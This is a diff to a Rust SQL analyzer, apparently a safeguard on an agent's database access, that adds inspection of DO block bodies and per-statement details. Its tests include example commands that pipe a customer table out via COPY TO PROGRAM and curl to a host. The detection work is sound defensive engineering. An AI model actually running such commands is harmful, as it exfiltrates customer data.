@@ -520,6 +520,21 @@ impl fmt::Debug for NormalizedQuery {
     }
 }
 
+/// One statement of a text (or of the body of a `DO` block).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct StatementInfo {
+    /// Statement kind (`PERFORM` in a `DO` body counts as `SELECT`).
+    pub kind: StatementKind,
+    /// Relations it names (identifier tokens only).
+    pub relations: Vec<RelationName>,
+    /// Shape, for a read (`None` when truncated or not a read).
+    pub shape: Option<Shape>,
+    /// `COPY` details, for a `COPY`.
+    pub copy: Option<CopyInfo>,
+    /// From the body of a `DO` block.
+    pub nested: bool,
+}
+
 /// Result of [`analyze`].
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct QueryAnalysis {
@@ -529,6 +544,7 @@ pub struct QueryAnalysis {
     shape: Option<Shape>,
     copy: Option<CopyInfo>,
     statements: usize,
+    parts: Vec<StatementInfo>,
 }
 
 impl QueryAnalysis {
@@ -540,7 +556,16 @@ impl QueryAnalysis {
             shape: None,
             copy: None,
             statements: 0,
+            parts: Vec::new(),
         }
+    }
+
+    /// Every statement of the text, then the statements of a `DO` block
+    /// body (one level, `nested`), in order. Empty when the text did not
+    /// lex unambiguously.
+    #[must_use]
+    pub fn parts(&self) -> &[StatementInfo] {
+        &self.parts
     }
 
     /// Kind of the first statement.
@@ -594,13 +619,14 @@ pub struct AnalyzeOptions {
 }
 
 impl AnalyzeOptions {
-    /// Default: not truncated; a `LIMIT` of 10 000 rows or more counts as
-    /// reading the whole relation.
+    /// Default: not truncated; a `LIMIT` of more than 10 000 rows counts
+    /// as reading the whole relation (the agent's own sampling never goes
+    /// beyond 10 000 rows).
     #[must_use]
     pub fn new() -> Self {
         Self {
             possibly_truncated: false,
-            large_limit: 10_000,
+            large_limit: 10_001,
         }
     }
 
@@ -636,6 +662,31 @@ pub fn analyze(text: &str, opts: AnalyzeOptions) -> QueryAnalysis {
     for s in &statements {
         collect_relations(s, &mut relations);
     }
+    let mut parts: Vec<StatementInfo> = statements
+        .iter()
+        .map(|s| statement_info(s, opts, false))
+        .collect();
+    // `DO $$ … $$`: the body is code; its statements are analyzed too (one
+    // level), so a `COPY … TO PROGRAM` inside a block is seen.
+    if statements.len() == 1 && word(statements[0].first()) == Some("do") {
+        if let Some(body) = do_body(text) {
+            if let Ok(inner) = lex(body, true) {
+                for st in split_statements(&inner) {
+                    if let Some(st) = plpgsql_statement(st) {
+                        let info = statement_info(&st, opts, true);
+                        for r in &info.relations {
+                            if relations.len() < MAX_RELATIONS && !relations.contains(r) {
+                                relations.push(r.clone());
+                            }
+                        }
+                        if parts.len() < MAX_PARTS {
+                            parts.push(info);
+                        }
+                    }
+                }
+            }
+        }
+    }
     let (shape, copy) = match statements.first() {
         Some(first) if !opts.possibly_truncated => match kind {
             StatementKind::Copy => (None, copy_info(first, opts.large_limit)),
@@ -653,7 +704,113 @@ pub fn analyze(text: &str, opts: AnalyzeOptions) -> QueryAnalysis {
         shape,
         copy,
         statements: statements.len(),
+        parts,
     }
+}
+
+/// Most statements described per text.
+const MAX_PARTS: usize = 64;
+
+fn statement_info(s: &[Tok], opts: AnalyzeOptions, nested: bool) -> StatementInfo {
+    let kind = first_kind(s);
+    let mut relations = Vec::new();
+    collect_relations(s, &mut relations);
+    let (shape, copy) = if opts.possibly_truncated {
+        (None, None)
+    } else {
+        match kind {
+            StatementKind::Copy => (None, copy_info(s, opts.large_limit)),
+            k if k.is_read() => (main_shape(s), None),
+            _ => (None, None),
+        }
+    };
+    StatementInfo {
+        kind,
+        relations,
+        shape,
+        copy,
+        nested,
+    }
+}
+
+/// The body of `DO [LANGUAGE x] $tag$ body $tag$` (dollar quoting only).
+fn do_body(text: &str) -> Option<&str> {
+    let b = text.as_bytes();
+    let skip_ws = |mut i: usize| {
+        while i < b.len() && b[i].is_ascii_whitespace() {
+            i += 1;
+        }
+        i
+    };
+    let mut i = skip_ws(0);
+    if !text.get(i..i + 2)?.eq_ignore_ascii_case("do") {
+        return None;
+    }
+    i = skip_ws(i + 2);
+    if text
+        .get(i..i + 8)
+        .is_some_and(|w| w.eq_ignore_ascii_case("language"))
+    {
+        i = skip_ws(i + 8);
+        while i < b.len() && is_ident_cont(b[i]) {
+            i += 1;
+        }
+        i = skip_ws(i);
+    }
+    if b.get(i) != Some(&b'$') {
+        return None;
+    }
+    let tag_end = dollar_tag(b, i)?;
+    let tag = &b[i..=tag_end];
+    let body = tag_end + 1;
+    let close = find(&b[body..], tag)?;
+    text.get(body..body + close)
+}
+
+/// A PL/pgSQL statement reduced to its SQL part: leading block keywords
+/// (`BEGIN`, `DECLARE`…) skipped, `PERFORM` read as `SELECT`, and the
+/// `INTO` target of a `SELECT` removed (a variable, not a relation).
+fn plpgsql_statement(s: &[Tok]) -> Option<Vec<Tok>> {
+    let start = s.iter().position(|t| {
+        matches!(t, Tok::Word(w) if matches!(
+            w.as_str(),
+            "select" | "insert" | "update" | "delete" | "merge" | "copy" | "with" | "values"
+                | "table" | "perform"
+        ))
+    })?;
+    let mut out: Vec<Tok> = s[start..].to_vec();
+    if word(out.first()) == Some("perform") {
+        out[0] = Tok::Word("select".to_owned());
+    }
+    if first_kind(&out) == StatementKind::Select {
+        let mut depth = 0usize;
+        let mut i = 0;
+        while i < out.len() {
+            match &out[i] {
+                Tok::Punct(p) if p == "(" => depth += 1,
+                Tok::Punct(p) if p == ")" => depth = depth.saturating_sub(1),
+                Tok::Word(w) if w == "into" && depth == 0 => {
+                    let mut j = i + 1;
+                    if word(out.get(j)) == Some("strict") {
+                        j += 1;
+                    }
+                    while let Some((_, next)) = qualified_name(&out, j) {
+                        j = next;
+                        if is_punct(out.get(j), ",") {
+                            j += 1;
+                        } else {
+                            break;
+                        }
+                    }
+                    out.drain(i..j);
+                    continue;
+                }
+                _ => {}
+            }
+            i += 1;
+        }
+    }
+    Some(out)
 }
 
 /// Kind from the first word of a text that did not lex: the prefix up to
@@ -1059,7 +1216,17 @@ fn reducing_aggregate(w: &str) -> bool {
 /// Shape of the main query of a read statement (top level only).
 fn main_shape(s: &[Tok]) -> Option<Shape> {
     let start = main_start(s)?;
-    let base_depth = s[..start].iter().filter(|t| is_punct(Some(t), "(")).count();
+    // Open parentheses before the main keyword (a leading `(`), as a
+    // running balance: closed CTE bodies do not count.
+    let base_depth = s[..start].iter().fold(0usize, |d, t| {
+        if is_punct(Some(t), "(") {
+            d + 1
+        } else if is_punct(Some(t), ")") {
+            d.saturating_sub(1)
+        } else {
+            d
+        }
+    });
     let mut depth = 0usize;
     let mut shape = Shape {
         star: false,
@@ -1431,6 +1598,70 @@ mod tests {
         assert!(s.filtered);
         let s = shape("select a from t union select a from u");
         assert!(!s.whole_relation(10));
+    }
+
+    #[test]
+    fn every_statement_is_described() {
+        let a = analyze(
+            "select 1; copy crm.customers to program 'x'",
+            AnalyzeOptions::new(),
+        );
+        assert_eq!(a.parts().len(), 2);
+        assert_eq!(a.parts()[0].kind, StatementKind::Select);
+        let c = a.parts()[1].copy.unwrap();
+        assert_eq!(c.endpoint, CopyEndpoint::Program);
+        assert!(c.whole_relation);
+    }
+
+    #[test]
+    fn do_block_bodies_are_analyzed() {
+        let a = analyze(
+            "DO $x$ DECLARE n int; BEGIN copy crm.customers to program 'curl -d @- h'; \
+             select count(*) into n from crm.t; perform * from crm.u; END $x$",
+            AnalyzeOptions::new(),
+        );
+        let nested: Vec<_> = a.parts().iter().filter(|p| p.nested).collect();
+        assert_eq!(nested.len(), 3);
+        assert_eq!(nested[0].copy.unwrap().endpoint, CopyEndpoint::Program);
+        assert_eq!(
+            nested[1].relations.len(),
+            1,
+            "INTO target is not a relation"
+        );
+        assert_eq!(nested[1].relations[0].name, "t");
+        assert!(nested[2].shape.unwrap().whole_relation(10_001));
+        assert!(a.normalized().is_none());
+        assert!(
+            analyze("do 'begin null; end'", AnalyzeOptions::new())
+                .parts()
+                .iter()
+                .all(|p| !p.nested)
+        );
+    }
+
+    #[test]
+    fn cte_queries_are_shaped_on_their_main_query() {
+        let shape = |q: &str| *analyze(q, AnalyzeOptions::new()).shape().unwrap();
+        let s = shape("with x as (select * from t) select * from x where id = 1");
+        assert!(s.filtered, "{s:?}");
+        let s = shape("with x as (select id from t where a) select count(*) from x");
+        assert!(s.aggregated, "{s:?}");
+        let s = shape("with x as (select * from t where a) select * from x");
+        assert!(!s.filtered);
+        let c = *analyze(
+            "copy (with x as (select * from t) select * from x where id = 1) to stdout",
+            AnalyzeOptions::new(),
+        )
+        .copy()
+        .unwrap();
+        assert!(!c.whole_relation);
+        let c = *analyze(
+            "copy (with x as (select * from t) select * from x) to stdout",
+            AnalyzeOptions::new(),
+        )
+        .copy()
+        .unwrap();
+        assert!(c.whole_relation);
     }
 
     #[test]
